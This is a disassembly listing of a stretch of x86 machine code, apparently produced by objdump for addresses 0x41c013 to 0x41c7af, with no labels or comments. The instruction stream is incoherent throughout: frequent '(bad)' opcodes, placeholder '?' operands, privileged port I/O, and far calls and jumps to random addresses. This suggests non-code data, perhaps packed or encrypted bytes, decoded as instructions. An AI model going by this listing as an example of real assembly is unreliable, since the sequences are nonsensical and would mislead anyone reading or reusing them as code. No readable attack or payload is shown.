  41c013:	adc    al,0xad
  41c015:	push   edi
  41c016:	int3   
  41c017:	in     al,dx
  41c018:	and    al,0x30
  41c01a:	mov    eax,DWORD PTR [edx+0x60]
  41c01d:	(bad)
  41c021:	bound  edi,QWORD PTR [ebx+0xe]
  41c024:	lahf   
  41c025:	inc    eax
  41c026:	sar    DWORD PTR [ebx-0x20f7c775],0x5d
  41c02d:	pop    edx
  41c02e:	pop    edi
  41c02f:	stos   BYTE PTR es:[edi],al
  41c030:	outs   dx,BYTE PTR ds:[esi]
  41c031:	test   al,0x24
  41c033:	mov    ?,esp
  41c035:	ret    0xff9f
  41c038:	daa    
  41c039:	xchg   esi,eax
  41c03a:	(bad)  
  41c03b:	mov    edi,0xbaf7ad16
  41c040:	pop    edx
  41c041:	mov    edx,ss
  41c043:	imul   ebp,DWORD PTR [ebp-0x32],0x65069692
  41c04a:	scas   al,BYTE PTR es:[edi]
  41c04b:	sbb    eax,DWORD PTR [ebx+0x7849a405]
  41c051:	jnp    0x41c034
  41c053:	stos   BYTE PTR es:[edi],al
  41c054:	ins    BYTE PTR es:[edi],dx
  41c055:	sub    eax,0x5787b670
  41c05a:	retf   0x1511
  41c05d:	clc    
  41c05e:	aaa    
  41c05f:	ins    DWORD PTR es:[edi],dx
  41c060:	mov    eax,ds:0x6d40a713
  41c065:	cli    
  41c066:	aam    0xab
  41c068:	and    DWORD PTR [ecx+0x72],0x1a19b2ff
  41c06f:	xchg   ebx,eax
  41c070:	mov    dl,0xe4
  41c072:	mov    ah,0x4a
  41c074:	test   BYTE PTR [ebx],dh
  41c076:	adc    bh,dh
  41c078:	mov    eax,ds:0xbbf49fa3
  41c07d:	mov    esi,0x8cf99f96
  41c082:	pop    es
  41c083:	in     al,dx
  41c084:	popf   
  41c085:	dec    esp
  41c086:	sti    
  41c087:	jp     0x41c070
  41c089:	in     al,0x9d
  41c08b:	sbb    BYTE PTR [ebp-0x13d62ebc],bh
  41c091:	push   ebx
  41c092:	push   ebx
  41c093:	call   0x295910e5
  41c098:	jns    0x41c118
  41c09a:	cmp    dh,BYTE PTR [edx+0x3e2a3440]
  41c0a0:	xor    eax,0xd09a9d1c
  41c0a5:	mov    ds:0x15ae4357,eax
  41c0aa:	cli    
  41c0ab:	adc    eax,0x98a5d847
  41c0b0:	pop    eax
  41c0b1:	inc    esp
  41c0b2:	repz mov ebx,0xaa8eedc3
  41c0b8:	cmovno ebx,DWORD PTR [ebx]
  41c0bb:	ds (bad) 
  41c0bd:	std    
  41c0be:	pop    eax
  41c0bf:	push   0xffffff9a
  41c0c1:	fcomip st,st(3)
  41c0c3:	es push 0xe84642a2
  41c0c9:	adc    BYTE PTR [edi-0x6],0xaa
  41c0cd:	(bad)  
  41c0ce:	xlat   BYTE PTR ds:[ebx]
  41c0cf:	adc    DWORD PTR [edi+0x384ed449],esp
  41c0d5:	push   0xb2418492
  41c0da:	and    ebp,DWORD PTR [ecx-0x7b]
  41c0dd:	inc    ebp
  41c0de:	sbb    ecx,DWORD PTR [ebp-0x17304a2c]
  41c0e4:	sub    al,0xc6
  41c0e6:	add    al,0x51
  41c0e8:	loopne 0x41c0b4
  41c0ea:	jo     0x41c104
  41c0ec:	inc    edi
  41c0ed:	leave  
  41c0ee:	rcl    BYTE PTR [esi+0x19],1
  41c0f1:	ins    BYTE PTR es:[edi],dx
  41c0f2:	add    al,0x2b
  41c0f4:	push   cs
  41c0f5:	pop    esi
  41c0f6:	jmp    0xef658361
  41c0fb:	cmp    esi,DWORD PTR [ecx]
  41c0fd:	out    dx,eax
  41c0fe:	mov    gs,WORD PTR [ebx]
  41c100:	mov    edx,0xb2a15846
  41c105:	xchg   ecx,eax
  41c106:	arpl   WORD PTR [ebx],di
  41c108:	xor    DWORD PTR [ecx+0x27],eax
  41c10b:	inc    ecx
  41c10c:	push   DWORD PTR [ebx+0x44]
  41c10f:	cli    
  41c110:	out    dx,al
  41c111:	sbb    dh,ah
  41c113:	xor    esp,0x32
  41c116:	or     ecx,DWORD PTR [edx-0x17]
  41c119:	(bad)  
  41c11b:	in     al,0xd6
  41c11d:	iret   
  41c11e:	xchg   ch,al
  41c120:	jp     0x41c18b
  41c122:	xchg   ebp,eax
  41c123:	int    0xe4
  41c125:	test   dh,al
  41c127:	bound  ebp,QWORD PTR [ebp-0x3cbbfbe5]
  41c12d:	xchg   esi,eax
  41c12e:	sub    eax,0x1f5aec19
  41c133:	inc    esi
  41c134:	cdq    
  41c135:	hlt    
  41c136:	dec    DWORD PTR [esi-0x4b]
  41c139:	rcl    BYTE PTR [edi],0xe5
  41c13c:	cmp    esp,edi
  41c13e:	in     al,0x6a
  41c140:	sub    bl,bl
  41c142:	add    ebx,DWORD PTR [eax+0x78160d38]
  41c148:	bound  ebp,QWORD PTR [edi]
  41c14a:	shl    DWORD PTR [ecx-0x59],0x7c
  41c14e:	test   eax,0x28b093d6
  41c153:	push   eax
  41c154:	xchg   ebp,eax
  41c155:	cdq    
  41c156:	repz jecxz 0x41c1b1
  41c159:	push   edx
  41c15a:	inc    edx
  41c15b:	push   ecx
  41c15c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c15d:	add    DWORD PTR [ebx],esi
  41c15f:	fisub  WORD PTR es:[edi-0x7263407c]
  41c166:	ja     0x41c1a2
  41c168:	ror    BYTE PTR cs:[esp+ebp*8+0x43],cl
  41c16d:	fs dec ecx
  41c16f:	sub    eax,0xece2612f
  41c174:	mov    al,0xcb
  41c176:	in     al,0x19
  41c178:	pop    ebp
  41c179:	xchg   edx,ecx
  41c17b:	inc    edi
  41c17c:	xchg   ebp,eax
  41c17d:	cli    
  41c17e:	(bad)  
  41c17f:	(bad)  
  41c180:	rcl    BYTE PTR [eax-0xeaad46b],cl
  41c186:	xor    al,BYTE PTR [edi]
  41c188:	adc    edi,DWORD PTR [ebx-0x62ced448]
  41c18e:	dec    eax
  41c18f:	fisttp DWORD PTR [edi+0x1ff29146]
  41c195:	xor    dl,BYTE PTR [edx+ecx*4]
  41c198:	test   DWORD PTR [ebx+0x56],edi
  41c19b:	sub    dh,cl
  41c19d:	cmp    BYTE PTR [edx+0x6b],dh
  41c1a0:	hlt    
  41c1a1:	cmp    BYTE PTR fs:[eax],cl
  41c1a4:	adc    eax,0x5c9fbe2e
  41c1a9:	inc    ecx
  41c1aa:	call   0x534b15be
  41c1af:	loopne 0x41c209
  41c1b1:	adc    BYTE PTR [ebp-0x227c508],0x3e
  41c1b8:	or     BYTE PTR [edx],dh
  41c1ba:	ja     0x41c1aa
  41c1bc:	pop    esp
  41c1bd:	fisttp WORD PTR [ecx]
  41c1bf:	xchg   esp,eax
  41c1c0:	jmp    0x41c1ef
  41c1c2:	test   DWORD PTR [ecx+0x67],ebp
  41c1c5:	and    DWORD PTR [eax+0x1ac7a55c],esp
  41c1cb:	mov    BYTE PTR [ebx],dh
  41c1cd:	mov    ds:0x5feb527b,al
  41c1d2:	sub    ah,BYTE PTR [edi+eax*1+0x15]
  41c1d6:	(bad)  
  41c1d7:	mov    al,0xc8
  41c1d9:	mov    ecx,0x83fb4cbd
  41c1de:	jmp    0x6b922fa5
  41c1e3:	mov    esp,0x5a7c59c1
  41c1e8:	in     al,0xd0
  41c1ea:	ss out dx,eax
  41c1ec:	or     BYTE PTR [esi+eiz*2],cl
  41c1ef:	xchg   BYTE PTR [ecx],ch
  41c1f1:	and    DWORD PTR [esi],esp
  41c1f3:	pop    ebx
  41c1f4:	cs push 0xd6d1cfb6
  41c1fa:	aas    
  41c1fb:	loope  0x41c217
  41c1fd:	ret    0x1ef8
  41c200:	stos   DWORD PTR es:[edi],eax
  41c201:	std    
  41c202:	out    dx,al
  41c203:	iret   
  41c204:	clc    
  41c205:	jmp    0x41c258
  41c207:	popa   
  41c208:	push   ecx
  41c209:	call   0x26c87b5e
  41c20e:	ja     0x41c1b6
  41c210:	in     al,0x3e
  41c212:	cmp    eax,0x1d2d5d84
  41c217:	es stos DWORD PTR es:[edi],eax
  41c219:	add    ecx,DWORD PTR [esi]
  41c21b:	mov    BYTE PTR [eax-0x15],0x2a
  41c21f:	out    0x10,eax
  41c221:	sahf   
  41c222:	push   0xffffff81
  41c224:	add    DWORD PTR [edx],ebx
  41c226:	mov    bh,0x77
  41c228:	push   es
  41c229:	fisttp DWORD PTR [esi+ebp*4+0x69]
  41c22d:	push   0xffffff9c
  41c22f:	jb     0x41c290
  41c231:	mov    bh,0xea
  41c233:	in     al,dx
  41c234:	fwait
  41c235:	int    0x4d
  41c237:	int3   
  41c238:	mov    ds:0xe089f485,al
  41c23d:	inc    edx
  41c23e:	cld    
  41c23f:	out    0x30,eax
  41c241:	mov    esp,0x861dd539
  41c246:	or     eax,edx
  41c248:	cli    
  41c249:	pop    edx
  41c24a:	adc    DWORD PTR [edx+0x7adaa348],ebx
  41c250:	hlt    
  41c251:	fmul   DWORD PTR [ecx+0x25]
  41c254:	ror    BYTE PTR [ebx],1
  41c256:	jl     0x41c208
  41c258:	add    ah,ch
  41c25a:	xor    BYTE PTR [ecx-0x197c5e7f],al
  41c260:	cli    
  41c261:	aam    0xcb
  41c263:	and    dl,dl
  41c265:	and    al,0x79
  41c267:	mov    bl,BYTE PTR [esi+0x3f]
  41c26a:	jmp    0x2a1d7098
  41c26f:	fistp  WORD PTR [esi-0x7f]
  41c272:	scas   al,BYTE PTR es:[edi]
  41c273:	sbb    BYTE PTR [eax+eax*8+0x76c3a55a],dh
  41c27a:	retf   
  41c27b:	xor    al,0xa
  41c27d:	sahf   
  41c27e:	xor    eax,0x52a8f6e9
  41c283:	dec    eax
  41c284:	xor    BYTE PTR [ebx+0xee93211],0xd
  41c28b:	jp     0x41c289
  41c28d:	xchg   edi,eax
  41c28e:	or     DWORD PTR ds:0xbf44fdd,eax
  41c294:	enter  0x3fca,0xe
  41c298:	call   0x26e80865
  41c29d:	jo     0x41c270
  41c29f:	test   DWORD PTR [ebx+esi*8-0x64ac23d5],ebx
  41c2a6:	xor    BYTE PTR [edi],bl
  41c2a8:	addr16 sub eax,0x45abec40
  41c2ae:	mov    ds:0x3dd0e6a2,al
  41c2b3:	pop    esi
  41c2b4:	jmp    0x41c237
  41c2b6:	loopne 0x41c2aa
  41c2b8:	xchg   esi,eax
  41c2b9:	mov    ch,ch
  41c2bb:	mov    eax,ds:0xb7c5ece6
  41c2c0:	sbb    BYTE PTR [ebp+0x13a0f56c],bh
  41c2c6:	pop    es
  41c2c7:	aad    0x50
  41c2c9:	pop    edi
  41c2ca:	stos   BYTE PTR es:[edi],al
  41c2cb:	ficomp DWORD PTR [esi+0x504449a9]
  41c2d1:	sar    DWORD PTR [ebx],1
  41c2d3:	jne    0x41c271
  41c2d5:	push   ss
  41c2d6:	sub    DWORD PTR [ebx-0x36],edx
  41c2d9:	ss pusha 
  41c2db:	inc    eax
  41c2dc:	add    DWORD PTR [edi-0x45],ecx
  41c2df:	adc    edx,DWORD PTR [ecx+0x55]
  41c2e2:	stc    
  41c2e3:	sbb    bh,al
  41c2e5:	xchg   ebp,eax
  41c2e6:	mov    ebp,0x828ef310
  41c2eb:	sti    
  41c2ec:	fchs   
  41c2ee:	test   BYTE PTR [ecx-0x36],al
  41c2f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2f2:	and    eax,0x685b5fe
  41c2f7:	das    
  41c2f8:	adc    BYTE PTR [edx-0x1e],ah
  41c2fb:	xor    DWORD PTR [edi],0x1c
  41c2fe:	mov    eax,0x763d539d
  41c303:	xchg   esp,eax
  41c304:	and    BYTE PTR [esi+0x793f9486],0xb7
  41c30b:	or     BYTE PTR [ebp-0x281a6d2d],dl
  41c311:	cmc    
  41c312:	jmp    0xaab4e494
  41c317:	inc    edx
  41c318:	fucom  st(5)
  41c31a:	mov    ah,bl
  41c31c:	lods   al,BYTE PTR ds:[esi]
  41c31d:	fs test eax,0xac223463
  41c323:	mov    BYTE PTR [edx],ch
  41c325:	pop    ebx
  41c326:	mov    bh,0x67
  41c328:	inc    edi
  41c329:	(bad)  
  41c32a:	fs jg  0x41c356
  41c32d:	sti    
  41c32e:	ds mov edx,0x7ab3d507
  41c334:	xor    BYTE PTR [edi+0x79619d4],0xa8
  41c33b:	push   ecx
  41c33c:	xlat   BYTE PTR ds:[ebx]
  41c33d:	sub    esi,DWORD PTR [esi+0x2cd6a67e]
  41c343:	fxch   st(7)
  41c345:	(bad)  
  41c346:	mov    eax,ds:0x75db463d
  41c34b:	jns    0x41c3b0
  41c34d:	sbb    al,0xfc
  41c34f:	fwait
  41c350:	and    al,0xdd
  41c352:	fiadd  WORD PTR [ecx]
  41c354:	sub    ecx,edi
  41c356:	mov    eax,ebx
  41c358:	lahf   
  41c359:	push   edx
  41c35a:	stc    
  41c35b:	xchg   edi,eax
  41c35c:	adc    edx,DWORD PTR [ebp+0x295d0381]
  41c362:	xchg   DWORD PTR [ebx-0x3d51938b],esp
  41c368:	inc    BYTE PTR [edi]
  41c36a:	sub    DWORD PTR [eax+0x7fcf4af5],0x277b0954
  41c374:	int3   
  41c375:	xchg   esi,ecx
  41c377:	push   eax
  41c378:	call   0xaac0:0x41780a8
  41c37f:	mov    esi,0x89c38a74
  41c384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c385:	sahf   
  41c386:	mov    eax,ds:0xc0478b59
  41c38b:	popa   
  41c38c:	sub    al,0x2e
  41c38e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41c390:	test   eax,0x81b7ad96
  41c395:	cmp    ebx,DWORD PTR [ecx]
  41c397:	lods   al,BYTE PTR ds:[esi]
  41c398:	data16 and al,0x44
  41c39b:	pop    ecx
  41c39c:	pop    ss
  41c39d:	cwde   
  41c39e:	test   al,0x3
  41c3a0:	sbb    BYTE PTR [ecx],cl
  41c3a2:	es mov dh,0xd2
  41c3a5:	and    eax,0x60993e09
  41c3aa:	in     eax,dx
  41c3ab:	ds mov ebp,0x53090ea0
  41c3b1:	inc    ebp
  41c3b2:	mov    dl,0x32
  41c3b4:	ss loope 0x41c402
  41c3b7:	daa    
  41c3b8:	dec    edi
  41c3b9:	sahf   
  41c3ba:	imul   edi,DWORD PTR [edx+0x6ca7d459],0xdeb46ef
  41c3c4:	sar    BYTE PTR [ebx],cl
  41c3c6:	inc    esi
  41c3c7:	cmp    eax,0xdf72f46f
  41c3cc:	sub    edx,DWORD PTR [ebx]
  41c3ce:	jns    0x41c3e5
  41c3d0:	or     eax,0x4ae1fccf
  41c3d5:	repnz or eax,0x64021be4
  41c3db:	cwde   
  41c3dc:	push   esp
  41c3dd:	in     eax,dx
  41c3de:	call   0x22d0:0xf323c9c
  41c3e5:	adc    DWORD PTR [ebp+ecx*8-0x592222f3],edi
  41c3ec:	mov    BYTE PTR [esi+edx*2+0x56],0x16
  41c3f1:	jo     0x41c3f0
  41c3f3:	retf   
  41c3f4:	and    BYTE PTR [edi],al
  41c3f6:	sahf   
  41c3f7:	jnp    0x41c459
  41c3f9:	(bad)  
  41c3fa:	div    BYTE PTR [ecx-0x4d]
  41c3fd:	mov    WORD PTR [esi-0x1313563d],cs
  41c403:	mov    ebp,0x523525f6
  41c408:	xor    eax,DWORD PTR [edx-0x6d]
  41c40b:	jmp    0x72e47482
  41c410:	ins    DWORD PTR es:[edi],dx
  41c411:	cwde   
  41c412:	pop    ecx
  41c413:	sbb    edx,DWORD PTR [esi]
  41c415:	(bad)  
  41c416:	mov    bl,0x40
  41c418:	jp     0x41c441
  41c41a:	sub    DWORD PTR [ebp-0x4acac705],ebx
  41c420:	and    eax,0xbba57e4b
  41c425:	jmp    0x486d7fe1
  41c42a:	nop
  41c42b:	popf   
  41c42c:	int3   
  41c42d:	hlt    
  41c42e:	pop    edx
  41c42f:	iret   
  41c430:	shl    DWORD PTR [esi+0x49],cl
  41c433:	fistp  QWORD PTR [esi+0x33]
  41c436:	ja     0x41c471
  41c438:	jnp    0x41c451
  41c43a:	fistp  DWORD PTR [ebx+0x21]
  41c43d:	cld    
  41c43e:	mov    dh,0xc7
  41c440:	stos   DWORD PTR es:[edi],eax
  41c441:	int3   
  41c442:	clc    
  41c443:	icebp  
  41c444:	cwde   
  41c445:	mov    edi,0x691f405d
  41c44a:	sar    dh,0x4b
  41c44d:	enter  0xa025,0xc9
  41c451:	mov    bh,BYTE PTR [edi]
  41c453:	and    al,0x4d
  41c455:	sub    eax,DWORD PTR [ebx]
  41c457:	and    edi,edx
  41c459:	imul   edi,DWORD PTR [ebx],0x75e2de7
  41c45f:	add    dh,0xa7
  41c462:	add    al,ch
  41c464:	(bad)  
  41c465:	pop    edx
  41c466:	call   0x31:0x4d26f837
  41c46d:	push   edi
  41c46e:	outs   dx,BYTE PTR ds:[esi]
  41c46f:	rol    DWORD PTR ds:0xb68d29c6,0x51
  41c476:	ss into 
  41c478:	xchg   esp,eax
  41c479:	push   esp
  41c47a:	sub    BYTE PTR [eax],ch
  41c47c:	sbb    al,0x24
  41c47e:	sub    eax,0x47250760
  41c483:	dec    edi
  41c484:	cmp    BYTE PTR [ebx],0x97
  41c487:	aaa    
  41c488:	ret    
  41c489:	lods   al,BYTE PTR ds:[esi]
  41c48a:	(bad)  
  41c48b:	jbe    0x41c49b
  41c48d:	pop    ecx
  41c48e:	sub    esi,edx
  41c490:	idiv   DWORD PTR [ecx+0x74]
  41c493:	cmp    eax,0xc038922b
  41c498:	jl     0x41c47e
  41c49a:	dec    ecx
  41c49b:	loop   0x41c4e2
  41c49d:	jmp    0x3eec1257
  41c4a2:	icebp  
  41c4a3:	or     ah,0x61
  41c4a6:	cmp    al,0x1c
  41c4a8:	je     0x41c44b
  41c4aa:	dec    ecx
  41c4ab:	in     al,dx
  41c4ac:	std    
  41c4ad:	mov    ah,0x51
  41c4af:	mov    al,ds:0x206707c2
  41c4b4:	dec    ebx
  41c4b5:	add    al,0x83
  41c4b7:	or     BYTE PTR [edx+0x3969d7aa],ah
  41c4bd:	add    dh,BYTE PTR [esi]
  41c4bf:	les    ebx,FWORD PTR [ebp+0x6f]
  41c4c2:	mov    ebp,0x42f70883
  41c4c7:	fsub   QWORD PTR [edx+0x7fefcbd7]
  41c4cd:	push   ds
  41c4ce:	gs int 0xc8
  41c4d1:	lods   eax,DWORD PTR ds:[esi]
  41c4d2:	lods   eax,DWORD PTR ds:[esi]
  41c4d3:	pop    ecx
  41c4d4:	stos   DWORD PTR es:[edi],eax
  41c4d5:	ss pop eax
  41c4d7:	mov    ds:0x3ac4b55f,eax
  41c4dc:	clc    
  41c4dd:	retf   0x2e39
  41c4e0:	aam    0x36
  41c4e2:	push   esi
  41c4e3:	sub    al,0xac
  41c4e5:	mov    bl,0x6a
  41c4e7:	je     0x41c51a
  41c4e9:	stc    
  41c4ea:	push   0x5e22851
  41c4ef:	aad    0xf
  41c4f1:	cmp    eax,0xa9fcdfc
  41c4f6:	sbb    dh,al
  41c4f8:	test   eax,0xc5a9713
  41c4fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4fe:	mov    eax,0x7bf2701c
  41c503:	int    0x44
  41c505:	push   es
  41c506:	inc    esi
  41c507:	xchg   esp,eax
  41c508:	lahf   
  41c509:	(bad)  
  41c50a:	les    esi,FWORD PTR [ebx+0x18d883ea]
  41c510:	mov    BYTE PTR [edx-0xd],bh
  41c513:	pop    ss
  41c514:	mov    ?,WORD PTR [ecx+0xcfeeb68]
  41c51a:	or     eax,0x36967e30
  41c51f:	(bad)  
  41c520:	out    0x5a,al
  41c522:	imul   eax,eax,0xc549f4bd
  41c528:	cmp    DWORD PTR [edx+0x393567db],esi
  41c52e:	mov    bh,dl
  41c530:	sti    
  41c531:	mov    ch,0x46
  41c533:	loope  0x41c579
  41c535:	or     al,ah
  41c537:	mov    dl,0xf3
  41c539:	lods   al,BYTE PTR ds:[esi]
  41c53a:	xchg   edi,eax
  41c53b:	lock shl BYTE PTR [edi+edi*4+0x38],0x89
  41c541:	and    eax,DWORD PTR [esi+edi*4+0x3a]
  41c545:	jmp    0x32b3:0x239e3f2e
  41c54c:	shl    DWORD PTR [ebx-0x52dfed94],cl
  41c552:	(bad)  
  41c553:	in     al,0xc5
  41c555:	sti    
  41c556:	dec    edi
  41c557:	push   es
  41c558:	cs iret 
  41c55a:	(bad)  
  41c55b:	aaa    
  41c55c:	rol    DWORD PTR [ebx-0x62],0xe5
  41c560:	dec    esp
  41c561:	mov    bh,0x4b
  41c563:	adc    ah,BYTE PTR [ebx-0x30]
  41c566:	cwde   
  41c567:	ins    DWORD PTR es:[edi],dx
  41c568:	dec    edi
  41c569:	dec    esi
  41c56a:	(bad)  
  41c56b:	mov    al,0x5c
  41c56d:	fdivp  st(4),st
  41c56f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c570:	(bad)  
  41c571:	xchg   edx,eax
  41c572:	rcr    BYTE PTR [ebp+ecx*4-0x3b],0xdb
  41c577:	sbb    ecx,DWORD PTR [ebx]
  41c579:	pop    ds
  41c57a:	add    DWORD PTR [edx-0x37],0x5d
  41c57e:	xchg   esp,eax
  41c57f:	fnsave [ebx-0x66]
  41c582:	sbb    ecx,edx
  41c584:	fisubr WORD PTR ds:0x8943a4cc
  41c58a:	xchg   ebp,eax
  41c58b:	push   0x8
  41c58d:	test   DWORD PTR [ecx+0x7f8db1c0],edx
  41c593:	sub    eax,0xbc287994
  41c598:	xchg   ebp,eax
  41c599:	retf   0x226e
  41c59c:	sbb    edi,ebx
  41c59e:	xor    al,0x2a
  41c5a0:	pop    ebp
  41c5a1:	sbb    edi,DWORD PTR [ebp-0xe]
  41c5a4:	jae    0x41c551
  41c5a6:	rol    BYTE PTR [eax+ebp*1-0x46],0x75
  41c5ab:	or     ebx,0x6e706f8f
  41c5b1:	fs stc 
  41c5b3:	mov    ch,0xdd
  41c5b5:	stc    
  41c5b6:	pop    esp
  41c5b7:	out    0x27,al
  41c5b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5ba:	popw   es
  41c5bc:	push   0xffffff81
  41c5be:	imul   eax,ecx,0xffffff97
  41c5c1:	sbb    dl,0x4c
  41c5c4:	jg     0x41c645
  41c5c6:	pop    edx
  41c5c7:	adc    DWORD PTR [esi-0x24],edi
  41c5ca:	lahf   
  41c5cb:	adc    al,0x86
  41c5cd:	test   eax,0xb4496b44
  41c5d2:	jne    0x41c5c3
  41c5d4:	or     DWORD PTR [edi],eax
  41c5d6:	xchg   ecx,eax
  41c5d7:	mov    ecx,0x985e3620
  41c5dc:	pop    edx
  41c5dd:	or     al,0x89
  41c5df:	dec    ebp
  41c5e0:	adc    eax,0x4391c728
  41c5e5:	nop
  41c5e6:	aad    0x6b
  41c5e8:	jnp    0x41c5cb
  41c5ea:	xor    eax,0x218ff146
  41c5ef:	sbb    BYTE PTR [eax+ecx*4+0x74a8dcc3],bl
  41c5f6:	mov    al,ds:0xa152f7dc
  41c5fb:	test   al,0x80
  41c5fd:	stos   BYTE PTR es:[edi],al
  41c5fe:	xlat   BYTE PTR ds:[ebx]
  41c5ff:	ror    DWORD PTR [ecx+edi*2+0x55],1
  41c603:	jl     0x41c592
  41c605:	inc    ebx
  41c606:	out    0xd6,al
  41c608:	mov    esp,0x8c783ccd
  41c60d:	pop    es
  41c60e:	push   es
  41c60f:	and    al,0x30
  41c611:	or     dl,BYTE PTR [edx]
  41c613:	and    ah,al
  41c615:	jo     0x41c5e8
  41c617:	cmc    
  41c618:	rcl    BYTE PTR [edx-0x38],0x66
  41c61c:	pop    ecx
  41c61d:	mov    esi,0x40f92439
  41c622:	(bad)  
  41c623:	test   eax,0xca1b2d06
  41c628:	dec    ebp
  41c629:	sub    al,0xc
  41c62b:	sbb    eax,0x53c9eb6d
  41c630:	mov    cl,0x53
  41c632:	(bad)  
  41c633:	pop    edi
  41c634:	mov    ebp,0x5e9f66bf
  41c639:	(bad)  
  41c63a:	clc    
  41c63b:	adc    ecx,DWORD PTR [ecx]
  41c63d:	xchg   DWORD PTR [eax],edx
  41c63f:	xchg   BYTE PTR [edi-0x458f5b5a],bh
  41c645:	jmp    0x41c6b1
  41c647:	call   0x2d3e:0xc2b578f5
  41c64e:	jge    0x41c65a
  41c650:	nop
  41c651:	sbb    ah,BYTE PTR [esi]
  41c653:	scas   al,BYTE PTR es:[edi]
  41c654:	add    DWORD PTR [edi+0x5d],ecx
  41c657:	pop    edx
  41c658:	js     0x41c6af
  41c65a:	mov    esp,0x2114c768
  41c65f:	shl    DWORD PTR [eax+0x1a],0xfc
  41c663:	lods   eax,DWORD PTR ds:[esi]
  41c664:	adc    BYTE PTR [ebx],ch
  41c666:	xor    BYTE PTR [ecx-0x72],dl
  41c669:	sbb    cl,al
  41c66b:	cmp    eax,0x68f78871
  41c670:	clc    
  41c671:	or     eax,0xcdc21c2d
  41c676:	add    BYTE PTR [esi],ch
  41c678:	xlat   BYTE PTR ds:[ebx]
  41c679:	add    eax,0xf6530945
  41c67e:	xor    ebx,DWORD PTR [eax-0x79]
  41c681:	in     eax,0xf
  41c683:	push   ss
  41c684:	mov    esp,0x9ab09eb
  41c689:	mov    BYTE PTR [eax+0x29],al
  41c68c:	pop    ss
  41c68d:	mov    esp,esp
  41c68f:	mov    bl,0xbe
  41c691:	arpl   WORD PTR [eax+eax*1],di
  41c694:	test   BYTE PTR [ebp-0x30235c02],ch
  41c69a:	jno    0x41c625
  41c69c:	dec    esp
  41c69d:	dec    sp
  41c69f:	imul   esi,DWORD PTR [edx+0x4e],0xffffffc0
  41c6a3:	fs xchg ebx,eax
  41c6a5:	or     esi,esi
  41c6a7:	ret    0x348d
  41c6aa:	inc    ebx
  41c6ab:	ret    0xa2e3
  41c6ae:	out    0xb,al
  41c6b0:	retf   
  41c6b1:	jne    0x41c724
  41c6b3:	imul   edx,edi,0xcd630095
  41c6b9:	pop    eax
  41c6ba:	pop    ecx
  41c6bb:	call   0x24070a79
  41c6c0:	or     BYTE PTR [ebx],dl
  41c6c2:	popf   
  41c6c3:	sub    BYTE PTR [eax],ch
  41c6c5:	jnp    0x41c650
  41c6c7:	mov    esp,0xc263061e
  41c6cc:	and    BYTE PTR [ecx-0x46],al
  41c6cf:	mov    cl,0x82
  41c6d1:	int    0x4
  41c6d3:	(bad)  
  41c6d4:	jmp    0x41c668
  41c6d6:	push   0x3e80e0ea
  41c6db:	repnz mov edx,edi
  41c6de:	xchg   DWORD PTR [edi+0x72aa09d5],esi
  41c6e4:	mov    ah,0x8d
  41c6e6:	loope  0x41c66b
  41c6e8:	scas   al,BYTE PTR es:[edi]
  41c6e9:	mov    ebp,DWORD PTR [ebp-0x6d]
  41c6ec:	rol    DWORD PTR [ecx],0xaa
  41c6ef:	mov    edx,0xf74bba2d
  41c6f4:	jle    0x41c70c
  41c6f6:	add    edi,ebp
  41c6f8:	scas   al,BYTE PTR es:[edi]
  41c6f9:	mov    dl,0x3f
  41c6fb:	scas   eax,DWORD PTR es:[edi]
  41c6fc:	scas   eax,DWORD PTR es:[edi]
  41c6fd:	xor    al,0x32
  41c6ff:	in     eax,dx
  41c700:	push   edi
  41c701:	into   
  41c702:	xor    DWORD PTR [edx],eax
  41c704:	xchg   ecx,eax
  41c705:	js     0x41c716
  41c707:	ret    0x7779
  41c70a:	enter  0xa83e,0x3f
  41c70e:	mov    ah,0xc5
  41c710:	push   cs
  41c711:	or     DWORD PTR [eax],ebx
  41c713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c714:	(bad)  
  41c715:	jmp    0x521a:0x7aa940b1
  41c71c:	mov    esi,0x253cfd4e
  41c721:	inc    esi
  41c722:	cli    
  41c723:	sub    eax,0xcc0bd92d
  41c728:	cmc    
  41c729:	popf   
  41c72a:	inc    eax
  41c72b:	add    eax,0x1a411969
  41c730:	xchg   esi,eax
  41c731:	cld    
  41c732:	push   esi
  41c733:	inc    edi
  41c734:	and    al,0xed
  41c736:	adc    al,0x50
  41c738:	mov    ch,0x1b
  41c73a:	mov    ebx,0x88e2d98f
  41c73f:	bound  ebx,QWORD PTR es:[eax-0x7adb0749]
  41c746:	fisttp QWORD PTR [eax+0x7d]
  41c749:	jns    0x41c79b
  41c74b:	ret    
  41c74c:	pop    esp
  41c74d:	xchg   edx,eax
  41c74e:	scas   ax,WORD PTR es:[edi]
  41c750:	call   0xc8fb:0x42812839
  41c757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c758:	mov    ds:0xb46e4863,al
  41c75d:	push   ds
  41c75e:	call   0xc792:0x387250e0
  41c765:	pushf  
  41c766:	or     BYTE PTR [ebx],bl
  41c768:	mov    al,0xab
  41c76a:	fs push ds
  41c76c:	mov    ebx,0xbd1c5512
  41c771:	jne    0x41c6f8
  41c773:	push   0x678505b4
  41c778:	jle    0x41c714
  41c77a:	jnp    0x41c7c5
  41c77c:	dec    edx
  41c77d:	das    
  41c77e:	jno    0x41c7ed
  41c780:	aaa    
  41c781:	push   ebp
  41c782:	pop    ebp
  41c783:	fisttp DWORD PTR [ebp-0x4e]
  41c786:	imul   edx,DWORD PTR [esi-0x7e],0x29
  41c78a:	push   ds
  41c78b:	cmp    eax,0xeb89e36f
  41c790:	sbb    esp,DWORD PTR [ecx+eiz*1-0x4e]
  41c794:	sbb    eax,0x9d5da32f
  41c799:	cmc    
  41c79a:	fdiv   DWORD PTR [esi]
  41c79c:	pop    ebp
  41c79d:	or     ch,ah
  41c79f:	ins    BYTE PTR es:[edi],dx
  41c7a0:	fsubr  QWORD PTR [ecx+0x162b0892]
  41c7a6:	push   edi
  41c7a7:	xchg   esp,eax
  41c7a8:	(bad)  
  41c7a9:	popf   
  41c7aa:	sub    ah,BYTE PTR [esi]
  41c7ac:	rol    DWORD PTR [ecx],0xe7
  41c7af:	dec    ebx
